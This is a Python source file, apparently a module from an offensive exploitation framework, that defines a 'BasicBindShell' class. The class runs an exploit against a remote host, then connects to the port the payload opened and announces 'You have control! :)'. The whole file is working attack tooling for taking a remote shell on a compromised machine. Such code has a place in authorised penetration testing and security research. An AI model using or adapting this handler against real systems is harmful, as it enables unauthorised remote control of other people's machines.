
import socket
import typing
from pytoolcore import style
from pytoolcore import netutils
from core import exploitcore, shellcore, scriptercore


class BasicBindShell(shellcore.AsynchronousBasicRemoteShell):

    SHELLREF: str = "BasicBindShell"

    def __init__(self, exploit: exploitcore.Exploit, scripter: scriptercore.Scripter,
                 rhost: str, rport: int)->None:
        if rhost and rport:
            shellcore.AsynchronousBasicRemoteShell.__init__(self, exploit=exploit, scripter=scripter,
                                                            rhost=rhost, rport=rport)
        else:
            raise ValueError("Missing or incorrect parameters")

    def initialize(self):
        self.exploit.run(self.rsockaddr)
        self.shellskt = socket.socket(self.protocol, socket.SOCK_STREAM)
        print(self.exploit.payload.optioninfo)
        bindport = int(self.exploit.payload.optioninfo)
        print(style.Style.info("Trying to connect to " + self.rhost))
        try:
            bindsockaddr = netutils.getsockaddr(self.rhost, bindport)
            self.shellskt.connect(bindsockaddr)
            print(style.Style.success("You have control! :)"))
        except (socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            print(style.Style.error(str(err)))
            print(style.Style.failure("Failed to connect :("))


blueprint: typing.Callable = BasicBindShell
name: str = BasicBindShell.SHELLREF
